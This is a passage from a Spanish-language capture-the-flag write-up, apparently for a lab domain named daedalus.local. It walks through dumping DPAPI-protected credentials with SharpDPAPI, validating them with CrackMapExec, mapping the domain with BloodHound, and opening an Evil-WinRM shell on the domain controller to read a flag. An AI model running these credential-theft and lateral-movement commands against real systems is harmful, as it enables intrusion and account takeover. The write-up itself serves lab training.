Se procedió a la implementación de SharpDPAPI con el objetivo de extraer credenciales del sistema. Para ello, se suministró la contraseña disponible, lo que permitió obtener las credenciales del usuario svc_backup.

```powershell
PS C:\Users\Administrator\Documents> upload SharpDPAPI.exe

Info: Uploading SharpDPAPI.exe to C:\Users\Administrator\Documents\SharpDPAPI.exe

Data: 202752 bytes of 202752 bytes copied

Info: Upload successful!

PS C:\Users\Administrator\Documents> .\SharpDPAPI.exe credentials /password:D43d4lusB1ll1ngB055  

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.3


[*] Action: User DPAPI Credential Triage

[*] Will decrypt user masterkeys with password: D43d4lusB1ll1ngB055

[*] Triaging Credentials for ALL users

Folder       : C:\Users\Administrator\AppData\Local\Microsoft\Credentials\

  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0

    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
    size             : 560
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}

Folder       : C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\

  CredFile           : C48FA9BC4637C67CB306A191C3C91E23

    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
    size             : 430
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 10/14/2020 5:35:22 AM
    TargetName       : Domain:interactive=DAEDALUS\svc_backup
    TargetAlias      :
    Comment          :
    UserName         : DAEDALUS\svc_backup
    Credential       : jkQ**********

PS C:\Users\Administrator\Documents>
```

Se llevó a cabo una verificación de las credenciales del usuario svc_backup utilizando CrackMapExec, confirmando que estas credenciales son válidas a nivel de dominio.

```bash
❯ crackmapexec smb dc1.daedalus.local -u svc_backup -p jkQ**********
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
SMB         daedalus.local  445    DC1              [+] daedalus.local\svc_backup:jkQ**********
```

Con el fin de realizar una enumeración exhaustiva del dominio, se utilizó BloodHound. Se autenticó en BloodHound utilizando las credenciales del usuario svc_backup, y se guardó toda la información recopilada en un archivo ZIP para un posterior análisis y revisión.

```powershell
❯ bloodhound-python -u svc_backup -p jkQ********** -ns 192.168.10.6 -d daedalus.local -c All --zip  
INFO: Found AD domain: daedalus.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.daedalus.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to GC LDAP server: dc1.daedalus.local
INFO: Connecting to LDAP server: dc1.daedalus.local
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 7 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WEB01.daedalus.local
INFO: Querying computer: DC1.daedalus.local
INFO: Done in 00M 34S
INFO: Compressing output into 20230901100806_bloodhound.zip
```

Tras cargar el archivo ZIP en BloodHound y analizar los datos, se identificó que el usuario svc_backup es miembro del grupo "Remote Management Users". Esto indica que el usuario tiene permisos para conectarse a WinRM (Windows Remote Management), lo que facilita la administración remota de sistemas Windows en la red.

Se procedió a establecer una conexión utilizando Evil-WinRM con el usuario svc_backup hacia el equipo DC1. Como resultado, se obtuvo una sesión de PowerShell que permitió leer una nueva bandera.

```powershell
❯ evil-winrm -i dc1.daedalus.local -u svc_backup -p jkQ********** 
PS C:\Users\svc_backup.DAEDALUS\Documents> whoami
daedalus\svc_backup
PS C:\Users\svc_backup.DAEDALUS\Documents> type ..\Desktop\flag.txt
ASCENSION{***********8****}
PS C:\Users\svc_backup.DAEDALUS\Documents>
```
